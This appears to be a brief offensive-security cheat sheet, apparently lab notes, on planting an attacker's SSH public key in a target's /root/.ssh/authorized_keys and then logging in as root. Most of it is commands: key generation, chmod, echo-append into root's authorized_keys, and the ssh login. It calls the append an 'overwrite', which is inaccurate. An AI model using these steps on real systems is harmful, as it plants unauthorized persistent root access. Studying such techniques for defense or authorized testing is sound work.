## What ?
File in `~/.ssh/` that contains public keys allowed to SSH into an account

### How to ?
Generate `SSH` key pairs
```
ssh-keygen -t rsa -f /path/to/key -C "your_comment"
```
`-t`: Specifies the key type (e.g., rsa, ecdsa, etc.). 
`-f`: Path where the key will be saved. 
`-C`: Comment for identifying the key.
Set permissions for private key
```
chmod 600 <PRIVATE KEY>
```
Overwrite `/root/.ssh/authorized_keys` with our `PUBLIC KEY`
```
echo "ssh-rsa AAAAB3...your_public_key... root" >> /root/.ssh/authorized_keys
```
Alternative command to overwrite authorized keys
```shell
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```
ROOT
```
ssh -i <PRIVATE KEY> root@<IP>
```
